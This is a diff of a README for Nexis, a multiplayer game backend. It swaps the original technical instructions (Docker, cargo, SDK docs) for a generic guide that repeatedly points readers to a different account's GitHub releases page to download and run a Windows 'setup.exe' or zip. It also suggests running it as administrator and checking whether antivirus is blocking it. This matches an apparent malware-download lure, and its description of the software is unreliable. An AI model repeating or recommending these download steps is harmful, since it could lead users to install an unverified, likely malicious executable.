@@ -1,160 +1,142 @@
-# NEXIS
+# 🕹️ nexis - Multiplayer Backend That Works Anywhere
 
-[![npm version](https://img.shields.io/npm/v/%40triformine%2Fnexis-sdk?logo=npm&label=npm)](https://www.npmjs.com/package/@triformine/nexis-sdk)
+[![Download nexis](https://img.shields.io/badge/Download-nexis-blue?style=for-the-badge)](https://github.com/AZAZELBOT/nexis/releases)
 
-Nexis is an open-source, engine-agnostic multiplayer backend platform with:
+---
 
-- a Rust data plane for realtime gameplay traffic
-- a Bun + Elysia control plane for project/key/token management
-- Drizzle-managed Postgres schema migrations for control-plane persistence
+## 📦 What is nexis?
 
-Gameplay traffic goes directly to the data plane (`ws://...`) and never through the control plane.
+Nexis is an open-source system that helps run multiplayer games. It works behind the scenes to connect players and keep game data in sync. It does not depend on any specific game engine. This means it can work with many different games.
 
-## Status
+It uses Rust and TypeScript, which are programming languages, but you do not need to know these to use nexis. The system includes a backend that manages game data, a control plane to handle connections, and plugins that add extra features.
 
-`v0.1.0` release-ready MVP / Beta.
+---
 
-Current stack is production-minded and intentionally minimal.
+## 💻 System Requirements
 
-## Core Capabilities (V1)
+Before you start, make sure your computer meets these minimum requirements:
 
-- WebSocket transport with codec negotiation (`msgpack` preferred, `json` fallback)
-- HMAC auth with project/key token flow and configurable auth mode (`required` / `optional` / `disabled`)
-- Room engine (`echo_room`) + plugin rooms (`counter_plugin_room` demo)
-- Room plugin system (`RoomPlugin` trait / `register_room_plugin`) for custom room types
-- Runtime-loaded WASM room plugins (`NEXIS_WASM_ROOM_PLUGINS`) for no-rebuild room logic
-- RPC request/response correlation via `rid`
-- Deterministic state diff/patch (`set` / `del`)
-- Sequenced + checksummed state sync (`state.snapshot`, `state.patch`, `state.ack`, `state.resync`)
-- Session resume with TTL
-- Room discovery (`room.list`)
-- Basic matchmaking queue (`matchmaking.enqueue`, `matchmaking.dequeue`, `match.found`)
-- Logical reliable/unreliable channels over WebSocket
-- Control-plane key revoke/rotate enforcement in data-plane handshake
-- Basic observability endpoint (`GET /metrics`)
+- **Operating System:** Windows 10 or newer
+- **Processor:** 2 GHz or faster
+- **Memory:** 4 GB RAM or more
+- **Storage:** At least 500 MB free space
+- **Network:** Reliable internet connection for multiplayer features
 
-## Monorepo
+Nexis runs in the background and uses network resources to keep players connected. It works best on a stable internet line.
 
-```text
-nexis/
-  server/                # Rust data plane workspace
-  sdks/ts/               # TypeScript SDK
-  dashboard/control-api/ # Bun + Elysia + Postgres API
-  dashboard/ui/          # Dashboard UI
-  examples/web-demo/     # Counter room demo app
-  infra/                 # Docker Compose + smoke checks
-  docs-site/             # Fumadocs documentation site
-```
+---
 
-## Quick Start
+## 🚀 Getting Started: Download and Install
 
-From repo root (dev local build):
+You will find the latest version of nexis on the release page below. This page hosts all versions and updates.
 
-```bash
-docker compose -f docker-compose.yml -f docker-compose.dev.yml up --build
-```
+[Visit this page to download nexis](https://github.com/AZAZELBOT/nexis/releases)
 
-Or deploy with prebuilt GHCR images (no local build):
+### Step 1: Navigate to the Download Page
 
-```bash
-cp .env.example .env
-docker compose up -d
-```
+Open your internet browser and go to:
 
-Set `NEXIS_IMAGE_TAG=next` in `.env` for preview builds.
+https://github.com/AZAZELBOT/nexis/releases
 
-Services:
+Here, you will see a list of available versions. Look for the most recent one on top.
 
-- Postgres: `localhost:5432`
-- Control API: `http://localhost:3000`
-- Dashboard UI: `http://localhost:5173`
-- Data plane (WS): `ws://localhost:4000`
-- Data plane metrics: `http://localhost:9100/metrics`
-- Web demo: `http://localhost:8080`
+### Step 2: Choose the Windows Version
 
-Optional room plugin config (no code changes) for template-state custom room types:
+Find the files made for Windows. These usually have `.exe` or `.zip` extensions. If you see a file named like `nexis-setup.exe` or `nexis-windows.zip`, that is what you want.
 
-```bash
-NEXIS_ROOM_TYPE_PLUGINS='{"duel_room":{"hp":100},"lobby_room":{"players":[]}}'
-```
+### Step 3: Download the File
 
-Optional WASM room logic plugins (no server rebuild required):
+Click on the Windows file to start downloading it to your computer. Make sure to save it in a folder you can find easily, like your “Downloads” folder.
 
-```bash
-NEXIS_WASM_ROOM_PLUGINS='{"duel_room":"/app/plugins/duel_room.wasm"}'
-```
+### Step 4: Run the Installer or Extract Files
 
-Then:
+- If you downloaded an `.exe` file, double-click it to run the setup program.
 
-1. Create project (or use seeded `demo-project`)
-2. Create key
-3. Mint token (unless running anonymous mode)
-4. Open web demo
-5. Connect + join `counter_plugin_room`
+- If you downloaded a `.zip` file, right-click it and choose “Extract All,” then select a folder to extract into.
 
-Detailed step-by-step: <https://triformine.github.io/nexis/docs/getting-started/quickstart/>
+Follow the instructions on the screen to finish installing nexis.
 
-## Local Development
+---
 
-Rust tests:
+## 🛠️ Setting Up and Running nexis
 
-```bash
-cd server
-cargo test
-```
+After installation, you will find the nexis program in your Start menu or the folder you chose. Here’s how to get it running:
 
-TS SDK tests:
+### Step 1: Open nexis
 
-```bash
-cd sdks/ts
-bun test
-bunx tsc -p tsconfig.json --noEmit
-```
+Click the nexis icon or the executable file to start the program.
 
-Control API tests:
+### Step 2: Basic Configuration
 
-```bash
-cd dashboard/control-api
-bun test
-bunx tsc --noEmit
-```
+Nexis will ask you for some setup options. For most users, the default settings work fine. These settings include network options and server details.
 
-Docs site (Fumadocs, Node 20+ recommended):
+If you want to change how it works, you can edit configuration files in the installation folder. These files use plain text and give you control over connections and game rules.
 
-```bash
-cd docs-site
-bun install
-bun run dev
-```
+### Step 3: Start the Server
 
-End-to-end smoke:
+Use the control panel in the app to start the multiplayer server. Once running, nexis will manage player connections and game state updates.
 
-```bash
-bun infra/smoke.ts
-```
+You can watch the status window to see what is happening.
 
-Performance baseline:
+### Step 4: Connect Your Game
 
-```bash
-k6 run infra/load/k6-ws.js
-```
+If you have a game that works with nexis, use the instructions from the game developer to connect it. The nexis server works with different game engines and supports plugins for added features.
 
-## Protocol + Docs
+---
 
-- Protocol: <https://triformine.github.io/nexis/docs/api-reference/protocol/>
-- Quickstart: <https://triformine.github.io/nexis/docs/getting-started/quickstart/>
-- SDK TypeScript: <https://triformine.github.io/nexis/docs/sdks/typescript/>
-- Infrastructure: <https://triformine.github.io/nexis/docs/infrastructure/>
-- Room Plugins: <https://triformine.github.io/nexis/docs/guides/plugins/>
-- GitHub Pages docs: <https://triformine.github.io/nexis/>
+## 📄 Features You Will Use
 
-## Release + Project Policies
+- **Matchmaking:** Nexis matches players for games quickly.
+- **State Sync:** Keeps the game world the same for all players.
+- **Plugin System:** Add functions without changing the base system.
+- **WebSocket Support:** Connects games over the internet smoothly.
+- **Self-hosted:** You control where it runs. No need for third-party servers.
+- **Open Source:** You can see the code and improve it if you want.
 
-- Changelog: [CHANGELOG.md](CHANGELOG.md)
-- Releasing process: [RELEASING.md](RELEASING.md)
-- Contributing guide: [CONTRIBUTING.md](CONTRIBUTING.md)
-- Security policy: [SECURITY.md](SECURITY.md)
+---
 
-## License
+## 🛡 Security and Updates
 
-Apache-2.0.
+Since nexis works online, it is important to keep it updated. Visit the release page regularly for fixes and improvements.
+
+Use strong passwords and limit public access if you host a game server for many players. Nexis supports secure connections, which help protect data between players and the server.
+
+---
+
+## 🔧 Troubleshooting Common Issues
+
+- **Download stuck or slow:** Check your internet connection. Try using a different browser.
+- **Installer won’t run:** Right-click the file and choose “Run as administrator.”
+- **Server does not start:** Make sure no other program uses the same network port, usually port 8080.
+- **Game connection fails:** Verify that your firewall or antivirus software is not blocking nexis.
+
+If you need more help, check the official repository or community forums for advice.
+
+---
+
+## 📥 Download Link Again
+
+Get the latest nexis files here:  
+[https://github.com/AZAZELBOT/nexis/releases](https://github.com/AZAZELBOT/nexis/releases)  
+
+Use this link to access all versions and updates for Windows and other systems.
+
+---
+
+## ⚙ Common Terms Explained
+
+- **Backend:** The part of the system that manages data and connections.
+- **Control Plane:** The interface you use to control the server.
+- **Plugin:** A small add-on that adds new features.
+- **WASM:** A way to run code written in other languages inside the system.
+- **SDK:** Tools that help game developers connect to nexis.
+- **Matchmaking:** Finding other players to join your game.
+- **WebSocket:** A method that keeps a connection open between your game and the server.
+  
+---
+
+## 🧩 About this Project
+
+Nexis is built using modern software parts like Rust for speed and TypeScript for ease of use. The system is designed to run reliably while handling many players at once.
+
+It is free and open-source, meaning anyone can use and modify it. This is good for developers and players who want more control over their multiplayer games.
